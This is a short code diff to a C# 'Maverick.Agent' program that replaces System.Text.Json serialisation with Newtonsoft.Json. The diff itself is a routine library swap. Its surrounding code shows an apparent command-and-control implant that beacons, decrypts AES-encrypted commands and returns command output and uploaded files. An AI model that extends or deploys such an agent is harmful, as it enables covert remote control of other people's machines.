@@ -1,10 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Net;
 using System.Net.Sockets;
-using System.Security.AccessControl;
 using System.Text;
 using System.Threading.Tasks;
+using Newtonsoft.Json;
 
 namespace Maverick.Agent
 {
@@ -46,7 +45,7 @@ namespace Maverick.Agent
                 ClientVersion = "1.0.0",
                 ClientIP = LocalIP,
             };
-            return Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(info));
+            return Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(info));
         }
 
         private static byte[] GenerateResponseCommand(CommandRequestModel cmd, byte[] Data, FileUploadModel file)
@@ -60,7 +59,7 @@ namespace Maverick.Agent
                 Command = cmd.Command,
                 CommandID = cmd.CommandID,
             };
-            return Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(command));
+            return Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(command));
         }
 
         public static async Task BeaconingAsync()
@@ -107,7 +106,7 @@ namespace Maverick.Agent
                 }
                 catch { }
                 var rawData = await CryptoFunction.DecryptAESPayload(newCommand);
-                var Command = System.Text.Json.JsonSerializer.Deserialize<CommandRequestModel>(rawData);
+                var Command = JsonConvert.DeserializeObject<CommandRequestModel>(Encoding.UTF8.GetString(rawData));
                 switch (Command.ActionType)
                 {
                     case "INFOCLIENT":
